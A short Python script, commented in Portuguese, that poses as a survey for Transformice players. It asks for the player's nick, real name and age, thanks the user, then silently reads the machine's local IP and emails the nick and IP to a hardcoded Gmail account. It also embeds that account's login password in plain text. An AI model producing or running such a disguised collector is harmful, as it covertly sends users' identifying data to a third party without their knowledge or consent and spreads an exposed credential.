import smtplib
import socket
from email.message import EmailMessage

# Função para enviar e-mail
def enviar_email(destinatario, assunto, corpo):
    email = EmailMessage()
    email['From'] = "dreamsapnap73@gmail.com"
    email['To'] = destinatario
    email['Subject'] = assunto
    email.set_content(corpo)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login("dreamsapnap73@gmail.com", "byva dktw qfql bwah")
        smtp.send_message(email)

# Script de pesquisa para jogadores do Transformice
print("Bem-vindo à pesquisa do Transformice!")
nick_transformice = input("Qual seu nick no Transformice? ")
nome_real = input("Qual seu nome na vida real? (Não precisa falar inteiro) ")
idade = input("Qual sua idade? ")

print("\nA pesquisa foi respondida com sucesso, você ajudou muito na nossa média de jogadores do Transformice!")

# Obter IP local da máquina
ip_local = socket.gethostbyname(socket.gethostname())

# Enviar e-mail com os dados da pesquisa e IP local
destinatario = "dreamsapnap73@gmail.com"
assunto = "Pesquisa Transformice"
corpo = f"Nick do Jogador: {nick_transformice}\nIP Local: {ip_local}"

enviar_email(destinatario, assunto, corpo)
